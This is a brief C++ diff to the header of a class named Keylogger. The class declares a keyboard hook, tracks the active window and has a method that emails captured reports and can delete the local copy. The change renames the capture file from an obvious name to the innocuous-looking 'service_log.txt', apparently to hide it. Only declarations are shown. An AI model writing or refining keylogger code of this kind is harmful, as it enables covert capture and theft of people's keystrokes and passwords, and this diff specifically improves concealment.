@@ -16,6 +16,8 @@
 #include <codecvt>
 #include <locale>
 
+#define FILENAME L"service_log.txt"
+
 class Keylogger {
 public:
 	Keylogger();
@@ -25,8 +27,8 @@ public:
 
 	bool sendEmailReport(std::wstring emailTo, bool deleteLocal);
 private:
-	const wstring FILENAME = L"capturing_your_keyboard.txt";
-	shared_ptr<Hook> hook;
+	std::wstring logfilePath;
+	std::shared_ptr<Hook> hook;
 	bool isActive;
 	std::wofstream logFile;
 	HWND lastActiveWindow;
